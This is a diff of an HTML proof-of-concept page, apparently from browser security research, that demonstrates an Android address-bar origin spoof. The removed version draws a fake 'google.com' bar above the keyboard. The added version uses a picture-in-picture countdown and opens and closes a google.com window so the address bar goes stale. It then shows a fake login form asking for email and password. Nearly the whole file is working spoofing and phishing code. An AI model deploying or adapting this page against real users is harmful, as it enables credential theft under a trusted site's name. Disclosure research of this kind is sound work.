@@ -1,114 +1,136 @@
-
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Fake Mini URL Bar Above Keyboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-  button { padding: 12px 18px; font-size: 16px; margin-right: 10px; }
-  textarea { width: 100%; height: 80px; font-size: 18px; margin-top: 20px; }
-
-  .fake-bar {
-    text-align: center;
-    background: #fff7f0;
-    border-top: 1px solid #e0cbb0;
-    border-bottom: 1px solid #e0cbb0;
-    color: #222;
-    font-size: 16px;
-    padding: 5px 0;
-    position: fixed;
-    width: 100%;
-    z-index: 9999;
-    opacity: 0;
-    visibility: hidden;
-    transition: opacity 0.3s ease, bottom 0.2s ease;
-  }
-
-  .fake-bar.show {
-    opacity: 1;
-    visibility: visible;
-  }
-
+html { font-family: sans-serif; }
+body {
+    overscroll-behavior: contain;
+}
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+#canvasElem { display: none; }
+.hide {
+    display: none;
+}
 </style>
 </head>
 <body>
-
-<button id="showBtn">Show Keyboard</button>
-<textarea id="ta" placeholder="Textarea for forced focus…"></textarea>
-
-<div class="fake-bar" id="fakeBar">google.com</div>
-
+<div id="startContent">
+<h1>PoC: Android origin spoof due to stale address bar</h1>
+<p id="instructions">Tap to continue</p>
+</div>
+<div id="spoofContent" class="hide">
+<h1>Spoooo&#128123;oooof</h1>
+<p><b>(ooh, scary!)</b></p>
+<p><i>A wild login form has appeared!</i></p>
+<h2>You must login to continue</h2>
+<form action="/?form" method="get">
+    <input id="inputElem" name="email" placeholder="Email">
+    <br>
+    <input name="password" placeholder="Password" type="password">
+    <input type="submit">
+</form>
+<a href="/?forgotpassword">Forgot password?</a>
+</div>
+<canvas id="canvasElem"></canvas>
 <script>
-const fakeBar = document.getElementById('fakeBar');
-const ta = document.getElementById('ta');
+var spoofUrl = 'https://www.google.com/account/about/';
 
-// Adjust fake bar position above keyboard
-function adjustFakeBar() {
-  const vv = window.visualViewport;
-  let keyboardHeight = 0;
+var delayToWaitForScroll = 1500;
 
-  if (vv) {
-    // Calculate height of virtual keyboard
-    keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
-  }
+var newWin;
 
-  fakeBar.style.bottom = keyboardHeight + 'px';
-}
+var pipWindow;
 
-// Show the fake bar
-function showFakeBar() {
-  fakeBar.classList.add('show');
-  adjustFakeBar();
-}
+var targetWidth = 1000;
+var targetHeight = 500;
 
-// Hide the fake bar
-function hideFakeBar() {
-  fakeBar.classList.remove('show');
-}
+var drawCanvas = (text) => {
+    const ctx = canvasElem.getContext('2d');
+    canvasElem.width = targetWidth;
+    canvasElem.height = targetHeight;
 
-// Listen for viewport changes (keyboard show/hide)
-if ('visualViewport' in window) {
-  window.visualViewport.addEventListener('resize', () => {
-    if (document.activeElement === ta) adjustFakeBar();
-  });
-}
+    ctx.fillStyle = `#fff`;
+    ctx.fillRect(0, 0, targetWidth, targetHeight);
 
-// Handle orientation changes
-window.addEventListener('orientationchange', adjustFakeBar);
-
-// Button click: show keyboard + fake bar
-document.getElementById("showBtn").onclick = async () => {
-  ta.focus();
-
-  // Fullscreen trick (for mobile Chrome)
-  try {
-    await document.documentElement.requestFullscreen();
-    setTimeout(() => {
-      document.exitFullscreen().catch(() => {});
-    }, 120);
-  } catch (e) {
-    // ignore fullscreen errors
-  }
-
-  // Delay to allow keyboard to appear
-  setTimeout(async () => {
-    // Show virtual keyboard if API available
-    if (navigator.virtualKeyboard?.show) {
-      try {
-        await navigator.virtualKeyboard.show();
-      } catch (e) {
-        // ignore errors
-      }
+    ctx.fillStyle = '#000';
+    text = text;
+    var fontSize;
+    if (text.length == 1) {
+        // Single character
+        fontSize = 400;
+        ctx.font = fontSize+'px sans-serif';
+        ctx.fillText(text, (targetWidth/2)-90, (targetHeight/2)+(fontSize/2));
+    } else if (text.length > 1) {
+        var lines = text.split('\n');
+        if (lines.length === 2) {
+            fontSize = 150;
+            ctx.font = fontSize+'px sans-serif';
+            ctx.fillText(lines[0], 50, (targetHeight/2)+(fontSize/2) - 50);
+            ctx.fillText(lines[1], 50, (targetHeight/2)+(fontSize/2) + 80);
+        } else {
+            fontSize = 170;
+            ctx.font = fontSize+'px sans-serif';
+            ctx.fillText(text, 50, (targetHeight/2)+(fontSize/2));
+        }
     }
+  }
 
-    // Show the fake omnibox above keyboard
-    showFakeBar();
-  }, 150);
-};
+var createVideo = (canvasElem) => {
+    const video = document.createElement('video');
+    video.muted = true;
+    video.srcObject = canvasElem.captureStream();
+    video.play();
+    return video;
+}
 
-// Hide fake bar when textarea loses focus
-ta.addEventListener('blur', hideFakeBar);
+var videoElem = createVideo(canvasElem);
+
+var showingPiP = false;
+videoElem.addEventListener('enterpictureinpicture', function(event) {
+    showingPiP = true;
+    instructions.innerText = 'Tap again to continue';
+});
+
+// PiP call needs video to be ready, and video needs canvas to be drawn at least once to be ready
+drawCanvas('');
+
+var replaceContents = () => {
+    startContent.classList.add('hide');
+    spoofContent.classList.remove('hide');
+    inputElem.focus();
+}
+
+var ran = false;
+
+window.addEventListener('click', () => {
+    if (!showingPiP) {
+        videoElem.requestPictureInPicture();
+        return;
+    }
+    if (ran) {
+        return;
+    }
+    ran = true;
+    newWin = window.open(spoofUrl, 'ao_spoof_test');
+    drawCanvas('3');
+    setTimeout(() => {
+        drawCanvas('2');
+    }, 1000);
+    setTimeout(() => {
+        drawCanvas('1');
+    }, 2000);
+    setTimeout(() => {
+        drawCanvas('Scroll down\nslowly');
+        //drawCanvas('Scroll down\nto continue');
+        //drawCanvas('Scroll down');
+        replaceContents();
+        setTimeout(() => {
+            newWin.close();
+            document.exitPictureInPicture();
+        }, delayToWaitForScroll);
+    }, 3000);
+});
 </script>
-
 </body>
 </html>
